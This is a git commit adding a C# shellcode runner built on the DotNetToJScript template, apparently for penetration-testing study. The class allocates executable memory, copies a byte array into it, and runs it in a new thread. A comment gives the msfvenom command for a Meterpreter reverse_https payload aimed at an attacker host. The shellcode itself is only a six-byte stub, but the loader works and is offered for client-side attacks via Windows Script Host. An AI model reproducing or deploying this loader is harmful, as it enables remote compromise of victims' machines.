65dae878bb6bc91d573a6ca230701a75590bd1fc
huifenglan <huifeng1@vt.edu>
2021-11-30 20:58:10 -0500

    shell code runner in cs

---
+++ ClientSideWithWindowsScriptHost/TestClass.cs
@@ -0,0 +1,51 @@
+﻿//    This file is part of DotNetToJScript.
+//    Copyright (C) James Forshaw 2017
+//
+//    DotNetToJScript is free software: you can redistribute it and/or modify
+//    it under the terms of the GNU General Public License as published by
+//    the Free Software Foundation, either version 3 of the License, or
+//    (at your option) any later version.
+//
+//    DotNetToJScript is distributed in the hope that it will be useful,
+//    but WITHOUT ANY WARRANTY; without even the implied warranty of
+//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+//    GNU General Public License for more details.
+//
+//    You should have received a copy of the GNU General Public License
+//    along with DotNetToJScript.  If not, see <http://www.gnu.org/licenses/>.
+
+
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+[ComVisible(true)]
+public class TestClass
+{
+    //the dll import must be done in the class, not the method
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+    public TestClass()
+    {
+        //this will be shell code, msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ip LPORT=port -f csharp
+        byte[] buf = new byte[6] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8 };
+        int size = buf.Length;
+
+        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+        Marshal.Copy(buf, 0, addr, size);
+        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(hThread, 0xFFFFFFFF);
+       
+    }
+
+    public void RunProcess(string path)
+    {
+        Process.Start(path);
+    }
+}
+
